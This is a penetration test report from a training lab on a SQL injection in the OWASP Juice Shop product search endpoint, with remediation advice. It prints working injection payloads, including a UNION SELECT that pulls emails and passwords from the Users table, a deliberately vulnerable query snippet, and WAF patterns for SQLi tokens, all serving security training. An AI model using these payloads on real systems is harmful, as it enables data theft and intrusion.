# Penetration Testing Report

Assessment Target: OWASP Juice Shop (Training Environment) **Vulnerability:** SQL Injection — Product Search Endpoint 
Report Date: June 16, 2026 
Severity: Critical

---
## 1. Executive Summary
During security assessment of the web application, a SQL Injection vulnerability was identified in the product search functionality. The vulnerability allows an unauthenticated attacker to manipulate backend database queries, resulting in unauthorized disclosure of all database records including soft-deleted products and potentially sensitive user data. Verbose error messages further compound the risk by exposing internal database structure to attackers.

---
## 2. Vulnerability Details

| Field                       | Details                             |
| --------------------------- | ----------------------------------- |
| **Vulnerability Type**      | SQL Injection (CWE-89)              |
| **OWASP Category**          | A03:2021 – Injection                |
| **Affected Endpoint**       | `GET /rest/products/search?q=`      |
| **Affected Parameter**      | `q` (unsanitized GET parameter)     |
| **Authentication Required** | No                                  |
| **CVSS v3.1 Score**         | 9.8 (Critical)                      |
| **CVSS Vector**             | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |

---
## 3. Technical Finding

### 3.1 Vulnerability Description
The `q` parameter in the product search endpoint is passed directly into a SQLite query without sanitization or parameterization. The backend constructs the following query:
```sql
SELECT * FROM Products
WHERE ((name LIKE '%[INPUT]%' OR description LIKE '%[INPUT]%')
AND deletedAt IS NULL)
ORDER BY name
```
User-supplied input is interpolated directly into the query string, allowing an attacker to break out of the intended string context and inject arbitrary SQL.

### 3.2 Evidence of Exploitation
Step 1 ->   Error-based confirmation
Sending a single quote caused the application to return a 500 error with the full SQL query exposed:
```
Request:  GET /rest/products/search?q='--
Response: 500 Internal Server Error
          "sql": "SELECT * FROM Products WHERE ((name LIKE '%'..."
          "code": "SQLITE_ERROR"
```

![Error-based SQL Injection](report-1781712307001.webp)
This confirmed SQL injection and identified the backend as SQLite.

Step 2 -> Authentication bypass / full data dump
The following payload was used to bypass the `deletedAt IS NULL` filter and return all records:
```
GET /rest/products/search?q='))--
```

Resulting SQL executed:
```sql
SELECT * FROM Products  
WHERE ((name LIKE '%'))--%'...
```

Response: `200 OK` -> returned all 46 product records including 10 soft-deleted items hidden from normal users.
![Dumping Deleted Products](report-1781712871390.webp)

Step 3 -> Soft-deleted records exposed
The following records were returned that are not visible through the normal application interface:

|Product ID|Name|
|---|---|
|11|Rippertuer Special Juice (flagged unsafe)|
|10|Christmas Super-Surprise-Box (2014 Edition)|
|12|OWASP Juice Shop Sticker (2015/2016 design)|
|27|Juice Shop Artwork|
|28|Global OWASP WASPY Award 2017 Nomination|
|39|Adversary Trading Card (Common)|
|40|Adversary Trading Card (Super Rare)|

---
## 4. Impact Analysis
Confidentiality -> High All database records are accessible to unauthenticated attackers. Further UNION-based injection can be used to pivot to other tables (e.g., `Users`) and extract email addresses and password hashes.

Integrity ->  High Depending on database permissions, an attacker may be able to execute `INSERT`, `UPDATE`, or `DELETE` statements, modifying product data, prices, or user records.

Availability -> Medium An attacker could execute destructive queries such as `DROP TABLE` if the database user has sufficient privileges, potentially causing application downtime.

Business Impact
- Unauthorized access to customer PII and credentials
- Potential for account takeover via harvested password hashes
- Regulatory exposure under IT Act 2000 (India) and applicable data protection obligations
- Reputational damage if exploited in production

---
## 5. Root Cause
The vulnerability exists due to direct string concatenation of user input into SQL queries without the use of prepared statements or parameterized queries. Additionally, the application returns raw database error messages to the client, which accelerates attacker reconnaissance.

---
## 6. Remediation Guidance
Primary Fix -> Parameterized Queries 
Replace string concatenation with prepared statements:
```javascript
// Vulnerable
db.query(`SELECT * FROM Products WHERE name LIKE '%${userInput}%'`);

// Secure
db.query('SELECT * FROM Products WHERE name LIKE ?', [`%${userInput}%`]);
```

Secondary Controls

| Control          | Action                                                                                                  |
| ---------------- | ------------------------------------------------------------------------------------------------------- |
| Input validation | Whitelist alphanumeric characters and common punctuation; reject or strip SQL metacharacters            |
| Error handling   | Suppress verbose database errors in production; log internally only                                     |
| Least privilege  | Database user should have `SELECT` only on required tables — no `DROP`, `INSERT`, or cross-table access |
| WAF rule         | Deploy rules to detect and block SQLi patterns (`'`, `--`, `UNION SELECT`, `OR 1=1`)                    |
| Security testing | Integrate SAST tools (e.g., Semgrep) and DAST scanning (e.g., OWASP ZAP) into the CI/CD pipeline        |

---
## 7. Verification Testing
After remediation is applied, the following tests should be conducted to confirm the fix:
Test 1 ->  Single quote injection
```
GET /rest/products/search?q='
Expected: 200 OK with empty results or input rejected — NOT a 500 error
```

Test 2 -> Boolean injection
```
GET /rest/products/search?q=' OR 1=1--
Expected: Normal search results only — deleted products must NOT appear
```

Test 3 -> Error suppression
```
Trigger any backend error
Expected: Generic error message returned to client — no stack traces or SQL queries exposed
```

Test 4 -> UNION extraction attempt
```
GET /rest/products/search?q=' UNION SELECT email,password,3,4,5,6,7,8,9 FROM Users--
Expected: No data returned, request blocked or returns empty
```

---
## 8. References
- OWASP Top 10 A03:2021 — Injection: https://owasp.org/Top10/A03_2021-Injection/
- CWE-89: Improper Neutralization of Special Elements used in SQL Command
- CVSS v3.1 Calculator: https://www.first.org/cvss/calculator/3.1

---

_This report was produced as part of a controlled security training exercise on OWASP Juice Shop. All testing was performed in an isolated lab environment._